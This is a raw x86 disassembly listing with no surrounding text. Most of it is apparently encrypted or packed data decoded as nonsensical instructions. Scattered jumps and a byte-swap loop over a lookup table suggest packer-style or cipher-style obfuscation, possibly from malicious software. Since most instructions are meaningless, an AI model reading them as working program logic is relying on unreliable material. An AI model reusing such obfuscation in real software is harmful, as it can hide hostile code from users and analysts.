  40c0c4:	add    eax,0xa649292c
  40c0c9:	or     DWORD PTR [eax-0x7e],0xfffffff8
  40c0cd:	neg    bh
  40c0cf:	icebp  
  40c0d0:	lock pop ds
  40c0d2:	fist   DWORD PTR [esi+0x1bc3672f]
  40c0d8:	test   edx,ecx
  40c0da:	test   eax,0x67e2b855
  40c0df:	imul   ecx,DWORD PTR [edi],0xd710f7e9
  40c0e5:	ja     0x40c162
  40c0e7:	add    eax,0x8b375be6
  40c0ec:	push   ebp
  40c0ed:	les    ecx,FWORD PTR [ebx-0x7cc0383]
  40c0f3:	xor    edx,eax
  40c0f5:	add    edi,ecx
  40c0f7:	add    edx,ecx
  40c0f9:	imul   edx,edi
  40c0fc:	mov    DWORD PTR [ebp+0xc],edx
  40c0ff:	mov    edx,DWORD PTR [ebp+0xc]
  40c102:	mov    DWORD PTR [ebp-0x24],edx
  40c105:	mov    edx,DWORD PTR [ebp-0x8]
  40c108:	add    edx,DWORD PTR [ebp-0x40]
  40c10b:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  40c112:	mov    DWORD PTR [ebp-0x1c],edx
  40c115:	mov    DWORD PTR [ebp-0xc],0xf89c8530
  40c11c:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  40c123:	mov    edx,DWORD PTR [ebp-0x18]
  40c126:	xor    edx,eax
  40c128:	add    edx,ecx
  40c12a:	jmp    0x40ccd1
  40c12f:	mov    edx,DWORD PTR [ebp-0x18]
  40c132:	jmp    0x40c4f0
  40c137:	call   0x9a62:0x428402d0
  40c13e:	out    0xb8,al
  40c140:	mov    si,WORD PTR ds:[edx+0x2e78567b]
  40c148:	mov    esi,DWORD PTR [eax+0x70]
  40c14b:	lahf   
  40c14c:	jge    0x40c1be
  40c14e:	jo     0x40c1b0
  40c150:	shl    BYTE PTR [ebx+ebp*1+0x645be910],cl
  40c157:	ins    DWORD PTR es:[edi],dx
  40c158:	sub    eax,0xde852c71
  40c15d:	pop    ds
  40c15e:	sbb    DWORD PTR [edi-0x11],0x6b
  40c162:	(bad)
  40c165:	rcr    ebp,1
  40c167:	inc    ebx
  40c168:	jmp    0x40c1df
  40c16a:	jae    0x40c1a8
  40c16c:	int    0x8d
  40c16e:	pop    es
  40c16f:	test   al,0xc2
  40c171:	jecxz  0x40c189
  40c173:	(bad)  
  40c174:	jmp    FWORD PTR ds:0x61882086
  40c17a:	xchg   esp,eax
  40c17b:	fs das 
  40c17d:	push   edx
  40c17e:	dec    edx
  40c17f:	outs   dx,DWORD PTR ds:[esi]
  40c180:	hlt    
  40c181:	jae    0x40c176
  40c183:	je     0x40c1f8
  40c185:	stos   BYTE PTR es:[edi],al
  40c186:	into   
  40c187:	(bad)  
  40c188:	out    0xc9,eax
  40c18a:	jne    0x40c1a9
  40c18c:	into   
  40c18d:	addr16 mov ds:0xdc32,eax
  40c191:	push   edi
  40c192:	push   ebp
  40c193:	mov    bh,0xdd
  40c195:	dec    esi
  40c196:	in     al,dx
  40c197:	popf   
  40c198:	pop    ss
  40c199:	push   cs
  40c19a:	push   ecx
  40c19b:	aaa    
  40c19c:	out    0x94,eax
  40c19e:	or     ecx,esp
  40c1a0:	xchg   ecx,eax
  40c1a1:	and    BYTE PTR [edx+0x3177b835],al
  40c1a7:	xor    eax,0xdbdc5c6a
  40c1ac:	or     edx,DWORD PTR [esi-0x76]
  40c1af:	mov    ds:0xedfdad30,eax
  40c1b4:	and    eax,0x2e7fd479
  40c1b9:	shl    bl,0x8c
  40c1bc:	xor    BYTE PTR [eax+0x6],al
  40c1bf:	push   0x19
  40c1c1:	mov    ecx,0xa66f2b4e
  40c1c6:	jns    0x40c15d
  40c1c8:	data16 test ch,bh
  40c1cb:	jo     0x40c243
  40c1cd:	inc    esi
  40c1ce:	dec    ebp
  40c1cf:	pop    esi
  40c1d0:	in     eax,0x56
  40c1d2:	pop    edi
  40c1d3:	nop
  40c1d4:	jecxz  0x40c21c
  40c1d6:	jae    0x40c217
  40c1d8:	repnz test eax,edx
  40c1db:	shl    DWORD PTR [eax+0x7a],1
  40c1de:	jnp    0x40c189
  40c1e0:	inc    eax
  40c1e1:	mov    cl,0x86
  40c1e3:	and    al,0x7b
  40c1e5:	ins    DWORD PTR es:[edi],dx
  40c1e6:	test   al,0x19
  40c1e8:	dec    ebp
  40c1e9:	aaa    
  40c1ea:	dec    edi
  40c1eb:	popf   
  40c1ec:	jo     0x40c1c2
  40c1ee:	enter  0xfe78,0x75
  40c1f2:	popa   
  40c1f3:	jmp    0xac0f:0x2f136db4
  40c1fa:	fmul   QWORD PTR [edx*2-0x4368445]
  40c201:	pop    esi
  40c202:	and    DWORD PTR [eax+0x1],edi
  40c205:	inc    BYTE PTR [ebp+0x16]
  40c208:	push   ss
  40c209:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c20a:	mov    bl,0x4b
  40c20c:	add    al,ch
  40c20e:	jne    0x40c28c
  40c210:	into   
  40c211:	push   ss
  40c212:	adc    BYTE PTR [ebx-0x79],0x42
  40c216:	scas   eax,DWORD PTR es:[edi]
  40c217:	mov    ds:0x6837043e,al
  40c21c:	cmp    bl,BYTE PTR ds:0x8988d9ce
  40c222:	arpl   WORD PTR [edi-0x3775eacb],cx
  40c228:	xor    ah,BYTE PTR [ebx+0x1c533f88]
  40c22e:	test   al,0x41
  40c230:	mov    ebx,ss
  40c232:	dec    ebp
  40c233:	nop
  40c234:	lahf   
  40c235:	ret    0x5171
  40c238:	sub    ah,BYTE PTR [edx+0x3ec7def]
  40c23e:	pop    esi
  40c23f:	dec    si
  40c241:	xchg   DWORD PTR [ecx-0x65953158],edi
  40c247:	inc    esi
  40c248:	push   edi
  40c249:	mov    esp,0x4ab67b25
  40c24e:	fsub   st(0),st
  40c250:	addr16 in al,dx
  40c252:	repz dec ebx
  40c254:	push   ds
  40c255:	mov    eax,0x140bdbc0
  40c25a:	add    DWORD PTR [ecx+ebx*2],ebp
  40c25d:	mov    al,ds:0x553d2b6e
  40c262:	and    BYTE PTR [esi+0x73],dh
  40c265:	aas    
  40c266:	add    DWORD PTR [edx-0x34d496ca],esi
  40c26c:	(bad)  
  40c26d:	scas   al,BYTE PTR es:[edi]
  40c26e:	test   edi,edx
  40c270:	sub    ecx,DWORD PTR [eax-0x567d06cf]
  40c276:	inc    edx
  40c277:	push   ds
  40c278:	cmp    ah,al
  40c27a:	xchg   DWORD PTR [esi+0x71],edi
  40c27d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c27e:	fidivr DWORD PTR [eax]
  40c280:	out    0x97,al
  40c282:	inc    ebx
  40c283:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c284:	shr    ecx,1
  40c286:	(bad)  
  40c287:	adc    dl,BYTE PTR [edi+0x606c009a]
  40c28d:	imul   ebx,DWORD PTR [ebx],0x867a704d
  40c293:	sbb    eax,0x64247fb5
  40c298:	ss pop edi
  40c29a:	ror    DWORD PTR [edi],cl
  40c29c:	lea    esp,[ebp+0x63]
  40c29f:	mov    WORD PTR [edi-0x28eb1b4b],ds
  40c2a5:	aad    0x76
  40c2a7:	mov    bh,0xfb
  40c2a9:	idiv   BYTE PTR ss:[eax]
  40c2ac:	test   eax,0x9d4bea1d
  40c2b1:	js     0x40c326
  40c2b3:	shl    ebp,cl
  40c2b5:	(bad)  
  40c2b6:	scas   al,BYTE PTR es:[edi]
  40c2b7:	jb     0x40c332
  40c2b9:	mov    dh,0x80
  40c2bb:	jbe    0x40c333
  40c2bd:	inc    edi
  40c2be:	xor    eax,0x845190c1
  40c2c3:	inc    ebp
  40c2c4:	or     ebp,DWORD PTR [ebp+ecx*4-0x134ba020]
  40c2cb:	sbb    esi,DWORD PTR cs:[ebx]
  40c2ce:	ins    DWORD PTR es:[edi],dx
  40c2cf:	xor    eax,0xa9e48949
  40c2d4:	push   esp
  40c2d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c2d6:	scas   al,BYTE PTR es:[edi]
  40c2d7:	arpl   si,ax
  40c2d9:	lds    ebp,FWORD PTR [edi+ecx*8+0x11049479]
  40c2e0:	push   0x7ab173a6
  40c2e5:	bound  esi,QWORD PTR [edi]
  40c2e7:	mov    ah,0x2a
  40c2e9:	dec    esp
  40c2ea:	add    DWORD PTR [ebx+ebp*4+0x68],0x374ecfed
  40c2f2:	pop    edx
  40c2f3:	clc    
  40c2f4:	loop   0x40c325
  40c2f6:	mov    edx,0xbce5e2b0
  40c2fb:	outs   dx,DWORD PTR ds:[esi]
  40c2fc:	test   eax,0xe6bfe6e6
  40c301:	jno    0x40c309
  40c303:	mov    eax,0x271c0c7e
  40c308:	mov    dh,BYTE PTR [ecx]
  40c30a:	pop    ss
  40c30b:	aad    0xb
  40c30d:	push   0xffffffbc
  40c30f:	xchg   ebp,eax
  40c310:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c311:	scas   eax,DWORD PTR es:[edi]
  40c312:	(bad)  
  40c313:	dec    edi
  40c314:	(bad)  
  40c315:	fiadd  WORD PTR [edi+0x35ef2ce2]
  40c31b:	add    BYTE PTR [eax-0x1a07a502],dh
  40c321:	mov    ebx,DWORD PTR [edx+0x7ec5506]
  40c327:	xchg   ebp,eax
  40c328:	xchg   ecx,eax
  40c329:	test   eax,0xd7b73c57
  40c32e:	cli    
  40c32f:	pop    ebx
  40c330:	or     al,0x95
  40c332:	add    al,0x8a
  40c334:	out    0x65,eax
  40c336:	mov    bh,0x39
  40c338:	je     0x40c2e5
  40c33a:	sbb    DWORD PTR [edx],ecx
  40c33c:	fdivr  DWORD PTR [edx]
  40c33e:	push   ecx
  40c33f:	fnstcw WORD PTR [ecx-0x1c]
  40c342:	jl     0x40c3bb
  40c344:	mov    ecx,0x19caf073
  40c349:	neg    BYTE PTR [ebx+0x12]
  40c34c:	out    dx,eax
  40c34d:	or     al,dh
  40c34f:	adc    BYTE PTR [ecx],cl
  40c351:	or     esi,DWORD PTR [esi+0x2c]
  40c354:	xor    eax,0xffffff80
  40c357:	add    ch,al
  40c359:	push   ebx
  40c35a:	add    BYTE PTR ds:0xeaf4df4f,ch
  40c360:	sbb    BYTE PTR [eax],cl
  40c362:	mov    edx,0x556ebad2
  40c367:	sbb    BYTE PTR [ebp-0x57],ah
  40c36a:	mov    bh,0x81
  40c36c:	mov    ebp,0xe8882f55
  40c371:	add    eax,0xad928d58
  40c376:	lahf   
  40c377:	out    dx,al
  40c378:	adc    bh,BYTE PTR [eax+ecx*2]
  40c37b:	fimul  DWORD PTR [edi]
  40c37d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c37e:	lahf   
  40c37f:	das    
  40c380:	xchg   ebp,eax
  40c381:	and    al,0xd1
  40c383:	jge    0x40c37e
  40c385:	jbe    0x40c327
  40c387:	shr    BYTE PTR [edx],cl
  40c389:	leave  
  40c38a:	cmp    cl,dl
  40c38c:	xchg   BYTE PTR [eax+0x17],cl
  40c38f:	sti    
  40c390:	stos   BYTE PTR es:[edi],al
  40c391:	into   
  40c392:	inc    esi
  40c393:	int    0x49
  40c395:	std    
  40c396:	xor    ebp,eax
  40c398:	adc    DWORD PTR [eax+0x1d8a17d7],edx
  40c39e:	cdq    
  40c39f:	ret    0x9b7e
  40c3a2:	in     eax,dx
  40c3a3:	loopne 0x40c3d4
  40c3a5:	stos   DWORD PTR es:[edi],eax
  40c3a6:	ss cmp al,bl
  40c3a9:	xchg   ecx,eax
  40c3aa:	mov    edx,0x5813b5bb
  40c3af:	int3   
  40c3b0:	(bad)  
  40c3b1:	imul   DWORD PTR ds:[ebx]
  40c3b4:	dec    esi
  40c3b5:	jp     0x40c3dd
  40c3b7:	dec    esi
  40c3b8:	xchg   esp,eax
  40c3b9:	fst    DWORD PTR [esi+0x71]
  40c3bc:	jae    0x40c3ef
  40c3be:	mov    esi,DWORD PTR [esi+0x412f308e]
  40c3c4:	fidiv  WORD PTR [ebx+0x7c879b9e]
  40c3ca:	add    eax,0xe1d0471a
  40c3cf:	jb     0x40c3b5
  40c3d1:	fdiv   QWORD PTR [ebp+0x6020a711]
  40c3d7:	xchg   esi,eax
  40c3d8:	jns    0x40c3dd
  40c3da:	lods   eax,DWORD PTR ds:[esi]
  40c3db:	add    DWORD PTR [esi+0x5ce1049c],edx
  40c3e1:	fdivr  DWORD PTR [esi-0x33]
  40c3e4:	lahf   
  40c3e5:	sub    dh,BYTE PTR gs:[edi]
  40c3e8:	mov    bl,0xea
  40c3ea:	cs and eax,0xd9f835d3
  40c3f0:	loope  0x40c46a
  40c3f2:	and    al,0x97
  40c3f4:	dec    ecx
  40c3f5:	popf   
  40c3f6:	mov    ebp,0xc2acb4a0
  40c3fb:	pop    esp
  40c3fc:	int3   
  40c3fd:	push   cs
  40c3fe:	sbb    eax,0xc4cb6303
  40c403:	inc    esi
  40c404:	cmp    eax,ebp
  40c406:	xor    BYTE PTR [eax-0x44],0xf9
  40c40a:	inc    ecx
  40c40b:	fist   WORD PTR [eax+0x1f]
  40c40e:	cmp    BYTE PTR [edx+0x5ed8b59a],ch
  40c414:	push   edx
  40c415:	xor    ecx,esp
  40c417:	add    DWORD PTR ds:0xba212a96,ecx
  40c41d:	popf   
  40c41e:	loopne 0x40c3c7
  40c420:	jl     0x40c427
  40c422:	push   ebp
  40c423:	pop    eax
  40c424:	out    0xb6,eax
  40c426:	test   esi,ebx
  40c428:	test   eax,0x445fe7e4
  40c42d:	or     eax,0x49cbc20b
  40c432:	jno    0x40c407
  40c434:	push   esp
  40c435:	sbb    BYTE PTR [ebp+0x75c42fc4],ch
  40c43b:	jo     0x40c477
  40c43d:	daa    
  40c43e:	pop    es
  40c43f:	inc    edx
  40c440:	and    BYTE PTR [eax+0x26e15b58],al
  40c446:	adc    al,BYTE PTR [edi-0x41]
  40c449:	imul   edi,DWORD PTR [edx+ebx*2-0x11],0x54
  40c44e:	add    BYTE PTR [edx],cl
  40c450:	mov    dh,0x2d
  40c452:	repz aad 0xe6
  40c455:	mov    ds,WORD PTR [ecx]
  40c457:	retf   0xbb65
  40c45a:	and    dl,dh
  40c45c:	cmp    al,0x8d
  40c45e:	push   eax
  40c45f:	xchg   ecx,eax
  40c460:	mov    esi,0x3802fd37
  40c465:	sbb    ecx,eax
  40c467:	xor    cl,bh
  40c469:	popa   
  40c46a:	mov    cl,0x58
  40c46c:	push   0x5db66f1
  40c471:	in     eax,dx
  40c472:	call   0x6b648ddb
  40c477:	xchg   ecx,eax
  40c478:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c479:	push   ss
  40c47a:	jno    0x40c409
  40c47c:	fisubr WORD PTR [ecx-0x62]
  40c47f:	arpl   WORD PTR [edx],si
  40c481:	inc    ebx
  40c482:	push   edx
  40c483:	fwait
  40c484:	and    cl,dh
  40c486:	ja     0x40c474
  40c488:	xor    bl,dl
  40c48a:	xchg   esi,eax
  40c48b:	jge    0x40c4d1
  40c48d:	pop    ds
  40c48e:	outs   dx,DWORD PTR ds:[esi]
  40c48f:	call   0x7230:0x123ad5c2
  40c496:	in     eax,0x1b
  40c498:	dec    eax
  40c499:	push   edi
  40c49a:	sub    edx,ebp
  40c49c:	test   DWORD PTR [esi],edx
  40c49e:	imul   eax,DWORD PTR [esi-0x3a1b4472],0xec161f4d
  40c4a8:	and    al,0x85
  40c4aa:	ins    DWORD PTR es:[edi],dx
  40c4ab:	push   eax
  40c4ac:	pop    ecx
  40c4ad:	xchg   ebp,eax
  40c4ae:	jmp    0x40c4be
  40c4b0:	mov    ebp,DWORD PTR [edi]
  40c4b2:	inc    eax
  40c4b3:	mov    esi,0x871a76ea
  40c4b8:	repnz pop ebp
  40c4ba:	div    DWORD PTR [edi+0x5b]
  40c4bd:	hlt    
  40c4be:	fsubp  st(1),st
  40c4c0:	not    DWORD PTR [edi+0x53]
  40c4c3:	mov    ecx,0xf1f3c522
  40c4c8:	les    edx,FWORD PTR [ebp+0x1e]
  40c4cb:	inc    ebp
  40c4cd:	pop    edi
  40c4ce:	(bad)  
  40c4cf:	fistp  WORD PTR [ecx-0x2b]
  40c4d2:	pop    ebx
  40c4d3:	xchg   ebx,eax
  40c4d4:	jnp    0x40c508
  40c4d6:	sbb    BYTE PTR [ecx-0x689fb24a],bl
  40c4dc:	outs   dx,BYTE PTR ds:[esi]
  40c4dd:	and    bl,cl
  40c4df:	dec    ebp
  40c4e0:	sar    esp,0xca
  40c4e3:	ret    0xd344
  40c4e6:	lahf   
  40c4e7:	clc    
  40c4e8:	popf   
  40c4e9:	mov    ecx,0x6532556a
  40c4ee:	push   esp
  40c4ef:	js     0x40c524
  40c4f1:	rol    BYTE PTR [ebx],1
  40c4f3:	push   ebp
  40c4f4:	in     al,dx
  40c4f5:	mov    edi,DWORD PTR [ebp-0x1c]
  40c4f8:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  40c4ff:	mov    BYTE PTR [ebp+0xf],dl
  40c502:	mov    edx,DWORD PTR [ebp-0xc]
  40c505:	xor    edx,eax
  40c507:	add    edx,DWORD PTR [ebp-0x14]
  40c50a:	mov    edi,DWORD PTR [ebp-0x1c]
  40c50d:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  40c514:	mov    BYTE PTR [ebp+0xb],dl
  40c517:	mov    dl,BYTE PTR [ebp+0xf]
  40c51a:	mov    edi,DWORD PTR [ebp-0xc]
  40c51d:	xor    edi,eax
  40c51f:	add    edi,DWORD PTR [ebp-0x14]
  40c522:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c525:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  40c52c:	mov    dl,BYTE PTR [ebp+0xb]
  40c52f:	jmp    0x40c8ed
  40c534:	xchg   esp,eax
  40c535:	dec    ebp
  40c536:	push   es
  40c537:	adc    ecx,eax
  40c539:	push   ecx
  40c53a:	xchg   ebx,eax
  40c53b:	dec    ebp
  40c53c:	lock sbb cl,cl
  40c53f:	pop    edx
  40c540:	jo     0x40c563
  40c542:	nop
  40c543:	sbb    eax,0x7070884d
  40c548:	lahf   
  40c549:	jge    0x40c5bb
  40c54b:	jo     0x40c4f4
  40c54d:	(bad)  
  40c550:	cdq    
  40c551:	shl    DWORD PTR [ebx+0x1e],0xcd
  40c555:	mov    ebp,0x1485adaf
  40c55a:	adc    eax,esi
  40c55c:	fidiv  WORD PTR [ebx+0x175609f3]
  40c562:	repz pop ds
  40c564:	outs   dx,BYTE PTR ds:[esi]
  40c565:	test   BYTE PTR [edi-0x54],0x7c
  40c569:	inc    ecx
  40c56a:	call   0x9c42:0x7947456d
  40c571:	jg     0x40c570
  40c573:	mov    eax,ds:0xb6f89cd8
  40c578:	xchg   esi,eax
  40c579:	add    al,0xf5
  40c57b:	sbb    bl,BYTE PTR [ebx-0x58]
  40c57e:	dec    esi
  40c57f:	jne    0x40c526
  40c581:	xchg   edx,eax
  40c582:	shl    DWORD PTR [edi+eiz*1-0x2c],0x62
  40c587:	int3   
  40c588:	cwde   
  40c589:	mov    cl,0x15
  40c58b:	pop    ebx
  40c58c:	lods   eax,DWORD PTR ds:[esi]
  40c58d:	(bad)  
  40c58e:	push   eax
  40c58f:	scas   eax,DWORD PTR es:[edi]
  40c590:	push   esi
  40c591:	push   ss
  40c592:	sbb    DWORD PTR [edx],eax
  40c594:	pop    esp
  40c595:	jecxz  0x40c5c2
  40c597:	test   al,0x95
  40c599:	fistp  DWORD PTR [esp+eax*1-0x11]
  40c59d:	adc    eax,0x17ee1b20
  40c5a2:	ss in  eax,0xd1
  40c5a5:	xchg   ebp,eax
  40c5a6:	jle    0x40c535
  40c5a8:	cmp    ebx,DWORD PTR [esi+0x7263ab1c]
  40c5ae:	mov    bh,0x62
  40c5b0:	mov    esp,0x60652857
  40c5b5:	in     al,dx
  40c5b6:	pop    esp
  40c5b7:	and    ch,BYTE PTR fs:[eax-0x66]
  40c5bb:	outs   dx,BYTE PTR ds:[esi]
  40c5bc:	dec    esi
  40c5bd:	shl    DWORD PTR [ecx+0x28b8e796],0xd8
  40c5c4:	sub    eax,0xc844e11e
  40c5c9:	cmp    bh,BYTE PTR [edi+0x59]
  40c5cc:	ja     0x40c5fc
  40c5ce:	push   esi
  40c5cf:	sar    DWORD PTR [esi],1
  40c5d1:	push   ebp
  40c5d2:	mov    ecx,0x9ed96386
  40c5d7:	bound  edx,QWORD PTR [ebx+0x3707d60d]
  40c5dd:	int3   
  40c5de:	fild   WORD PTR [ebp+0x3f]
  40c5e1:	in     eax,0x1e
  40c5e3:	(bad)  
  40c5e4:	mov    al,ds:0x70080ace
  40c5e9:	dec    edx
  40c5ea:	mov    eax,ds:0xb618646b
  40c5ef:	or     al,0xb4
  40c5f1:	fstp   st(2)
  40c5f3:	in     eax,dx
  40c5f4:	repz jae 0x40c5f7
  40c5f7:	aad    0x83
  40c5f9:	aas    
  40c5fa:	lods   eax,DWORD PTR ds:[esi]
  40c5fb:	mov    BYTE PTR [ebx],dh
  40c5fd:	popf   
  40c5fe:	cdq    
  40c5ff:	mov    dh,0x39
  40c601:	add    DWORD PTR [eax],edx
  40c603:	ja     0x40c5f7
  40c605:	in     eax,0x4d
  40c607:	dec    edi
  40c608:	or     edi,DWORD PTR [edx-0x79124720]
  40c60e:	adc    ecx,edi
  40c610:	rcl    DWORD PTR [eax],cl
  40c612:	mov    ebp,0xcba76242
  40c617:	shr    BYTE PTR [ebx-0x445b1567],1
  40c61d:	in     al,dx
  40c61e:	fs inc ebx
  40c620:	xor    eax,0x1035e44
  40c625:	add    al,0x4c
  40c627:	pushf  
  40c628:	in     al,0xa6
  40c62a:	sahf   
  40c62b:	ret    0x29f0
  40c62e:	pop    DWORD PTR [edi]
  40c630:	add    al,BYTE PTR [edx-0x9]
  40c633:	repnz inc edx
  40c635:	and    ebx,DWORD PTR [eiz*4+0x30e59044]
  40c63c:	push   cs
  40c63d:	sbb    al,0x86
  40c63f:	je     0x40c65d
  40c641:	xchg   edx,eax
  40c642:	retf   
  40c643:	(bad)  
  40c644:	adc    al,0x14
  40c646:	dec    ebp
  40c647:	rcl    DWORD PTR [ecx+0x6f],cl
  40c64a:	or     BYTE PTR [eax],ch
  40c64c:	adc    eax,esi
  40c64e:	or     al,0xf1
  40c650:	daa    
  40c651:	mov    ah,0xc5
  40c653:	es pop ecx
  40c655:	sbb    ecx,ebp
  40c657:	mov    eax,0x1bdbebb
  40c65c:	xchg   ecx,eax
  40c65d:	push   esi
  40c65e:	mov    edi,0x912de900
  40c663:	cmp    bh,dh
  40c665:	clc    
  40c666:	sub    DWORD PTR [edi-0x6c],0x380cf1d3
  40c66d:	pop    ss
  40c66e:	test   DWORD PTR [ebx],esi
  40c670:	mov    ah,BYTE PTR [ebp+0x34]
  40c673:	and    bh,ch
  40c675:	idiv   BYTE PTR [esi+ecx*8-0x54]
  40c679:	push   gs
  40c67b:	repnz xchg ecx,eax
  40c67d:	xor    esi,DWORD PTR [esi+ebx*8]
  40c680:	leave  
  40c681:	sbb    BYTE PTR [eax-0x3b805b7f],ah
  40c687:	jae    0x40c633
  40c689:	xchg   esp,eax
  40c68a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c68b:	mov    ds:0x722f6a70,al
  40c690:	and    al,0xd6
  40c692:	sub    DWORD PTR [edi],ecx
  40c694:	outs   dx,BYTE PTR ds:[esi]
  40c695:	mov    ss,WORD PTR [ecx]
  40c697:	test   DWORD PTR [edi],edi
  40c699:	jg     0x42c29caf
  40c69f:	fsub   st(7),st
  40c6a1:	and    eax,0x145ecb7c
  40c6a6:	shr    BYTE PTR [edi+edx*8+0x7e],1
  40c6aa:	or     eax,0x959983a7
  40c6af:	(bad)  
  40c6b0:	js     0x40c648
  40c6b2:	lock sbb cl,BYTE PTR [esi+edi*2+0x23]
  40c6b7:	stc    
  40c6b8:	xchg   BYTE PTR [ebp+0x60],bh
  40c6bb:	xchg   ebx,eax
  40c6bc:	dec    esp
  40c6bd:	mov    edi,0x9af7024a
  40c6c2:	jg     0x40c6fc
  40c6c4:	or     eax,0x70bdbed6
  40c6c9:	scas   eax,DWORD PTR es:[edi]
  40c6ca:	xchg   esi,eax
  40c6cb:	adc    al,BYTE PTR [ecx-0x3]
  40c6ce:	das    
  40c6cf:	xor    bh,dl
  40c6d1:	push   es
  40c6d2:	shl    DWORD PTR [ecx-0x7443ce91],1
  40c6d8:	push   ebp
  40c6d9:	aaa    
  40c6da:	jecxz  0x40c6f2
  40c6dc:	es xchg ecx,eax
  40c6de:	mov    esi,DWORD PTR [edi]
  40c6e0:	add    eax,DWORD PTR [ebp+eiz*2-0x43]
  40c6e4:	adc    al,0xe7
  40c6e6:	ss nop
  40c6e8:	(bad)  [esi-0xc]
  40c6eb:	nop
  40c6ec:	mov    dl,0xcd
  40c6ee:	lds    ebx,FWORD PTR [eax-0x1e]
  40c6f1:	xor    ebp,DWORD PTR [ebx-0x41]
  40c6f4:	sbb    esi,DWORD PTR [ebp+0x7]
  40c6f7:	cld    
  40c6f8:	mov    fs,WORD PTR [esi+0x5f61cbbb]
  40c6fe:	enter  0x3132,0xfc
  40c702:	jecxz  0x40c69c
  40c704:	xchg   esp,eax
  40c705:	sbb    bl,bh
  40c707:	sbb    BYTE PTR [ecx+0x20],dl
  40c70a:	aam    0x72
  40c70c:	pop    edx
  40c70d:	(bad)  
  40c70e:	fst    QWORD PTR [edx-0x2557aad8]
  40c714:	jnp    0x40c74b
  40c716:	mov    edi,0x6280d5c0
  40c71b:	mov    esp,0xb41de67f
  40c720:	add    al,0xd8
  40c722:	bound  eax,QWORD PTR [eax+0x7dd98f34]
  40c728:	hlt    
  40c729:	jp     0x40c6d9
  40c72b:	pop    eax
  40c72c:	jl     0x40c707
  40c72e:	jns    0x40c731
  40c730:	jno    0x40c764
  40c732:	inc    esi
  40c733:	sub    esp,0xffffffc1
  40c736:	push   cs
  40c737:	(bad)  
  40c738:	mov    ebx,esp
  40c73a:	loop   0x40c6cf
  40c73c:	ins    DWORD PTR es:[edi],dx
  40c73d:	repnz pop edi
  40c73f:	xchg   edi,eax
  40c740:	jmp    0x40c6fb
  40c742:	ficomp DWORD PTR [edx]
  40c744:	cs call 0x7e66cf26
  40c74a:	push   0xffffffc3
  40c74c:	xchg   edx,eax
  40c74d:	inc    edi
  40c74e:	dec    ebx
  40c74f:	mov    DWORD PTR [ebx-0x60],ebp
  40c752:	xor    eax,0x634e9783
  40c757:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c758:	adc    DWORD PTR [esi+ebp*4-0x1391c61d],ebp
  40c75f:	adc    al,0xb
  40c761:	fadd   DWORD PTR [edx]
  40c763:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c764:	jp     0x40c6e7
  40c766:	inc    edi
  40c767:	pop    esi
  40c768:	cmp    eax,0xc610f5a2
  40c76d:	jmp    0xccc9ef16
  40c772:	neg    DWORD PTR [ebx]
  40c774:	mov    ecx,0x6c7a1eec
  40c779:	(bad)  
  40c77a:	mov    ecx,0x624bcbfc
  40c77f:	xchg   ah,ch
  40c781:	xlat   BYTE PTR ds:[ebx]
  40c782:	cmp    BYTE PTR [edi],dl
  40c784:	lock xor DWORD PTR [edx],edi
  40c787:	sbb    DWORD PTR [ebx+0x7cc0b24c],ecx
  40c78d:	cmp    bl,bl
  40c78f:	outs   dx,BYTE PTR ds:[esi]
  40c790:	das    
  40c791:	xchg   esp,eax
  40c792:	and    ebp,ebx
  40c794:	mul    esi
  40c796:	mov    bh,0xee
  40c798:	xor    DWORD PTR [esi-0x244a6ee6],0x193a049c
  40c7a2:	test   al,0x7d
  40c7a4:	dec    esp
  40c7a5:	and    eax,DWORD PTR [ecx]
  40c7a7:	jl     0x40c79c
  40c7a9:	fild   WORD PTR [ebp-0x70]
  40c7ac:	add    edi,DWORD PTR [esi+edx*8-0x477f0c45]
  40c7b3:	jmp    FWORD PTR [esi]
  40c7b5:	push   ebx
  40c7b6:	add    BYTE PTR [eax-0x4e91b6dd],ah
  40c7bc:	call   0x8d738858
  40c7c1:	lds    edx,FWORD PTR [edi+0xb]
  40c7c4:	sbb    BYTE PTR [edi-0x57],cl
  40c7c7:	gs xchg edi,eax
  40c7c9:	inc    edx
  40c7ca:	mov    eax,ds:0xc82c835d
  40c7cf:	xchg   BYTE PTR [ecx],ch
  40c7d1:	repnz out dx,al
  40c7d3:	jo     0x40c7c4
  40c7d5:	es and al,0xdb
  40c7d8:	shr    DWORD PTR [ecx+0x27053503],0x49
  40c7df:	inc    eax
  40c7e0:	pop    esp
  40c7e1:	xor    eax,DWORD PTR [edi+eax*2+0x7d8ac6fa]
  40c7e8:	(bad)
  40c7ec:	lock mov eax,ds:0x780f4172
  40c7f2:	push   eax
  40c7f3:	cmp    eax,0x8d68f517
  40c7f8:	xchg   ebp,ebp
  40c7fa:	dec    DWORD PTR [ebx]
  40c7fc:	cld    
  40c7fd:	mov    ds:0xa37bcfb4,eax
  40c802:	inc    eax
  40c803:	xchg   ecx,eax
  40c804:	inc    esp
  40c805:	lods   eax,DWORD PTR ds:[esi]
  40c806:	das    
  40c807:	cmp    cl,BYTE PTR [eax]
  40c809:	jl     0x40c85d
  40c80b:	sub    bh,BYTE PTR [ebp-0x727955bc]
  40c811:	(bad)  
  40c812:	repz aaa 
  40c814:	jle    0x40c7b6
  40c816:	mov    ah,0x53
  40c818:	mov    eax,0x6b8bdb73
  40c81d:	pop    esi
  40c81e:	jmp    0x45d3:0xba4e3761
  40c825:	adc    BYTE PTR [edi+0x271aabc5],ch
  40c82b:	in     eax,0x17
  40c82d:	sub    dl,BYTE PTR [ecx-0x5e4a8cf2]
  40c833:	sub    BYTE PTR [ebp-0x6b],ah
  40c836:	add    eax,0xfc9f9d08
  40c83b:	pop    ecx
